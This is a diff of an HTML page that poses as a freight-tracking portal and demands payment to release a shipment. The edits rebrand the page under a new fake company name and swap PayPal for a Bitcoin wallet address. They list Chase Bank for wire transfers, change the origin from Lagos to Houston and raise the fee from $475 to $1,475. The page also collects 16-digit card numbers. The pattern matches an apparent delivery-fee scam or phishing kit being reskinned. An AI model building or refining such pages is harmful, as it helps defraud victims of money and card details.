@@ -71,7 +71,7 @@
                     <div class="bg-blue-600 p-2 rounded">
                         <svg class="w-6 h-6 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M3.055 11H5a2 2 0 012 2v1a2 2 0 002 2 2 2 0 012 2v2.945M8 3.935V5.5A2.5 2.5 0 0010.5 8h.5a2 2 0 012 2 2 2 0 104 0 2 2 0 012-2h1.064M15 20.488V18a2 2 0 012-2h3.064M21 12a9 9 0 11-18 0 9 9 0 0118 0z"></path></svg>
                     </div>
-                    <span class="text-xl font-bold text-blue-900 tracking-tight uppercase">Globe Link Logistics</span>
+                    <span class="text-xl font-bold text-blue-900 tracking-tight uppercase">Swift Freight Logix</span>
                 </div>
 
                 <!-- STEP 1: TRACKING GATEKEEPER -->
@@ -79,7 +79,7 @@
                     <h1 class="text-4xl font-black text-slate-900 mb-4">Track Your Shipment</h1>
                     <p class="text-slate-500 mb-8">Enter your Tracking ID to access payment and logistics details.</p>
                     <div class="relative max-w-md mx-auto">
-                        <input type="text" id="track-input" placeholder="Enter tracking code" 
+                        <input type="text" id="track-input" placeholder="Enter code" 
                             class="w-full px-8 py-5 rounded-full border-2 border-slate-200 focus:border-blue-600 outline-none shadow-sm text-xl font-bold uppercase tracking-widest transition-all">
                         <button onclick="checkTracking()" id="track-btn" class="absolute right-2 top-2 bottom-2 bg-blue-600 text-white px-8 rounded-full font-bold hover:bg-blue-700 transition-all active:scale-95">
                             Find
@@ -107,7 +107,7 @@
                             <!-- Tabs -->
                             <div class="grid grid-cols-3 gap-3 mb-8">
                                 <button onclick="showMethod('card')" id="tab-card" class="method-btn p-4 border-2 border-blue-600 bg-blue-50 rounded-xl text-xs font-bold text-blue-600 transition-all">Card</button>
-                                <button onclick="showMethod('paypal')" id="tab-paypal" class="method-btn p-4 border border-slate-200 rounded-xl text-xs font-bold text-slate-500 transition-all">PayPal</button>
+                                <button onclick="showMethod('paypal')" id="tab-paypal" class="method-btn p-4 border border-slate-200 rounded-xl text-xs font-bold text-slate-500 transition-all">Bitcoin</button>
                                 <button onclick="showMethod('bank')" id="tab-bank" class="method-btn p-4 border border-slate-200 rounded-xl text-xs font-bold text-slate-500 transition-all">Bank Transfer</button>
                             </div>
 
@@ -117,17 +117,18 @@
                                 <input type="text" required pattern="\d{16}" placeholder="16-Digit Card Number" class="w-full border-slate-200 border p-4 rounded-xl outline-none focus:ring-2 focus:ring-blue-500">
                             </div>
 
-                            <div id="form-paypal" class="payment-view hidden py-10 text-center bg-yellow-50 rounded-xl border border-yellow-100">
-                                <p class="text-sm text-yellow-800 font-medium">Proceed to secure PayPal checkout to finalize payment.</p>
+                            <div id="form-paypal" class="payment-view hidden py-10 text-center bg-yellow-50 flex flex-col items-center rounded-xl border border-yellow-100">
+                                <img src="./image/wallet.jpeg" alt="bitcoin:178MRAPrprUd6kq3HqabUz8Bad4DUfN3JV" class="w-60">
+                                <p class="text-sm text-yellow-800 font-medium">bitcoin:178MRAPrprUd6kq3HqabUz8Bad4DUfN3JV</p>
                             </div>
 
                             <div id="form-bank" class="payment-view hidden bg-blue-50 p-6 rounded-xl border border-blue-100 text-sm leading-relaxed">
                                 <strong class="text-blue-900 block mb-2 uppercase text-xs">Wire Transfer Details</strong>
-                                Bank: Global Logistics Bank<br>Acc: 0982231044<br>Name: Globe Link Ltd.
+                                Bank: Chase Bank<br>Acc: 0982231044<br>Name: Swift Freight Logix.
                             </div>
 
                             <button id="final-pay-btn" onclick="startProcessing()" class="mt-10 w-full bg-blue-600 text-white font-bold py-5 rounded-xl shadow-lg hover:bg-blue-700 active:scale-95 transition-all">
-                                Complete Transaction $475.00
+                                Complete Transaction $1,475.00
                             </button>
                         </div>
 
@@ -198,9 +199,9 @@
                 const isDone = data[TRACK_ID] === "success";
                 document.getElementById('shipment-data').innerHTML = `
                     <div class="flex justify-between border-b border-slate-50 pb-3"><span class="text-slate-400 uppercase text-[10px] font-bold">Status:</span> <span class="${isDone ? 'text-green-600' : 'text-orange-500'} font-black text-xs uppercase">${isDone ? 'Confirmed' : 'Pending Payment'}</span></div>
-                    <div class="flex justify-between border-b border-slate-50 pb-3"><span class="text-slate-400 uppercase text-[10px] font-bold">Origin:</span> <span class="font-semibold text-slate-700">Lagos, NG</span></div>
+                    <div class="flex justify-between border-b border-slate-50 pb-3"><span class="text-slate-400 uppercase text-[10px] font-bold">Origin:</span> <span class="font-semibold text-slate-700">Houston, Tx, USA</span></div>
                     <div class="flex justify-between border-b border-slate-50 pb-3"><span class="text-slate-400 uppercase text-[10px] font-bold">Destination:</span> <span class="font-semibold text-slate-700">London, UK</span></div>
-                    <div class="flex justify-between pt-2"><span class="text-slate-400 uppercase text-[10px] font-bold">Total:</span> <span class="text-blue-900 font-black text-lg">$475.00</span></div>
+                    <div class="flex justify-between pt-2"><span class="text-slate-400 uppercase text-[10px] font-bold">Total:</span> <span class="text-blue-900 font-black text-lg">$1,475.00</span></div>
                 `;
             } catch (err) { console.log("Awaiting sync..."); }
         }
